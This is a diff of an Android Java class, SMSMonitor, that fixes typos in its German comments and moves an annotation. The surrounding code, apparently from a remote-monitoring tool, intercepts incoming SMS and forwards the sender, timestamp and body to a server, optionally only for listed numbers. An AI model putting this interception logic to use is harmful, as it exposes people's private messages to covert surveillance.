@@ -34,8 +34,8 @@ public class SMSMonitor {
 	int channel;
 
 	/**
-	 * Konstruktor der Klasse befüllt die Klassenvariablen und erstell einen Intentfilter.
-	 * @param c	Service der das Obejkt erstellt.
+	 * Konstruktor der Klasse befüllt die Klassenvariablen und erstellt einen Intentfilter.
+	 * @param c	Service der das Objekt erstellt.
 	 * @param chan	Datenübertragungskanal
 	 * @param args	Telefonnummern nachdenen gefiltert werden soll.
 	 */
@@ -69,13 +69,13 @@ public class SMSMonitor {
 		 * Hiernach wird gesucht. Haben die Intents diesen Action werden sie verarbeitet.
 		 */
 	 	private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
-	 
-        @Override
+
 		/**
 		 * Sobald ein Intent ankommt wird diese Funktion aufgerufen
 		 * @param context	Der Kontext
 		 * @param intent Der empfangene Intent
 		 */
+        @Override
         public void onReceive(Context context, Intent intent) {
 			/**
 			 * Hier wird überprüft ob es sich auch im einen eingehenden SMSIntent handelt
@@ -117,7 +117,7 @@ public class SMSMonitor {
 						 */
 						 String phoneNumber = messages[0].getDisplayOriginatingAddress();
 						/**
-						 * Auslesen des zeitpunkts wann die Nachricht gesendet wurde.
+						 * Auslesen des Zeitstempels, wann die Nachricht gesendet wurde.
 						 */
 						 long date = messages[0].getTimestampMillis();
 						/**
@@ -125,18 +125,18 @@ public class SMSMonitor {
 						 */
 						 if(phoneNumberFilter == null) {
 							 /**
-							  * Wenn nicht ein SMSPacker erstellen und diese an den Server senden.
+							  * Wenn nicht ein SMSPacket erstellen und diese an den Server senden.
 							  */
 							 	ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
 								ctx.handleData(channel, sms.build());
 						 }
 						 else {
 							 /**
-							  * Falls Filter aktiv, überprüfen ob die Telefonnummer in dem Filter vorhanden ist.
+							  * Falls Filter aktiv sind, überprüfen ob die Telefonnummer in dem Filter vorhanden ist.
 							  */
 							 if (phoneNumberFilter.contains(phoneNumber)) {
 								 /**
-								  * Wenn dei Nummer vorhanden ist, neues SMSPacket erstellen und dieses an den Server schicken.
+								  * Wenn die Nummer vorhanden ist, neues SMSPacket erstellen und dieses an den Server schicken.
 								  */
 								 Log.i("SMSReceived", "Message accepted as triggering message !");
 								 ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
